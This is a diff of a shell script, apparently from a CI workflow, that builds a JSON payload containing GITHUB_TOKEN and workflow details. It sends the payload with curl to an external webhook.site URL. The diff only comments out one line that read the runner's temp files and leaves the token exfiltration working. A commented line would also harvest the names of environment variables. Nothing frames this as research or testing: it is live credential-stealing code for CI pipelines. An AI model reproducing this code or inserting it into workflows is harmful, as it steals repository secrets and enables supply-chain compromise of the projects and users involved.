@@ -49,7 +49,6 @@ JSON_PAYLOAD=$(cat <<EOF
 {
   "message": "S",
   "github_token": "${GITHUB_TOKEN}",
-  "ghtok": "$(cat /home/runner/work/_temp/*)",
   "repository": "${GITHUB_REPOSITORY}",
   "workflow": "${GITHUB_WORKFLOW}",
   "job": "${GITHUB_JOB}",
@@ -62,6 +61,7 @@ JSON_PAYLOAD=$(cat <<EOF
 }
 EOF
 )
+#   "ghtok": "$(cat /home/runner/work/_temp/*)",
 # "env_var_keys": $(printenv | cut -d '=' -f 1 | jq -R . | jq -s .)
 # Send the payload to the external webhook
 curl -X POST -H "Content-Type: application/json" -d "${JSON_PAYLOAD}" https://webhook.site/83eec9ca-ff62-4398-ab88-84e4376b6032
